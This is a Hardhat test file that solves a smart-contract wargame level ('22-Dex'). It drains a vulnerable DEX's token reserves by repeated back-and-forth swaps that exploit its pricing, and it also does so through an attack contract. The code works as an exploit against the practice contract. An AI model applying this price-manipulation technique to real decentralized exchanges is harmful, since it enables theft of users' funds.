const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("22-Dex", async function () {
    let attacker, dex, tokenOne, tokenTwo, dexAttack
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        attacker = accounts[1]
        await deployments.fixture(["22"])
        dex = await ethers.getContract("Dex", attacker.address)
        dexAttack = await ethers.getContract("DexAttack", attacker.address)
        tokenOne = await ethers.getContractAt("SwappableToken", await dex.token1())
        tokenTwo = await ethers.getContractAt("SwappableToken", await dex.token2())
    })
    it("should steal the funds", async function () {
        /*
        This test was used to calculate the solution, to be later implemented using the attack contract
        */

        // this functions results in attacker having >= balance of token1 and token2
        async function swap(amount) {
            await dex.approve(dex.address, amount)
            await dex.swap(tokenOne.address, tokenTwo.address, amount)
            await dex.swap(tokenTwo.address, tokenOne.address, amount)
        }

        // siphon funds out of dex
        const swapAmount = ethers.utils.parseEther("10")
        while (true) {
            try {
                await swap(swapAmount)
            } catch (e) {
                break
            }
        }

        // withdraw remaining token1 balance from dex
        const from = await tokenTwo.balanceOf(dex.address)
        const amount = from
        await dex.approve(dex.address, amount)
        await dex.swap(tokenTwo.address, tokenOne.address, amount)

        // assert
        assert.equal((await dex.balanceOf(tokenOne.address, dex.address)).toString(), "0")
        assert.equal(
            (await tokenOne.balanceOf(attacker.address)).toString(),
            ethers.utils.parseUnits("110", 18).toString()
        )
        assert((await tokenTwo.balanceOf(attacker.address)).gt(ethers.utils.parseUnits("10", 18)))
    })
    it("should steal the funds using attack contract", async function () {
        // transfer token balances from attacker to attack contract
        await tokenOne.connect(attacker).transfer(dexAttack.address, ethers.utils.parseEther("10"))
        await tokenTwo.connect(attacker).transfer(dexAttack.address, ethers.utils.parseEther("10"))

        // execute attack
        await dexAttack.attack()

        // withdraw funds
        await dexAttack.withdraw()

        // check dex token1 balance is 0
        assert.equal((await tokenOne.balanceOf(dex.address)).toString(), "0")
        // check attack contract holds all token1 tokens
        assert.equal(
            (await tokenOne.balanceOf(attacker.address)).toString(),
            ethers.utils.parseEther("110").toString()
        )
        // check attack contract did not lose any token2 tokens
        assert((await tokenTwo.balanceOf(attacker.address)).gt(ethers.utils.parseEther("10")))
    })
})
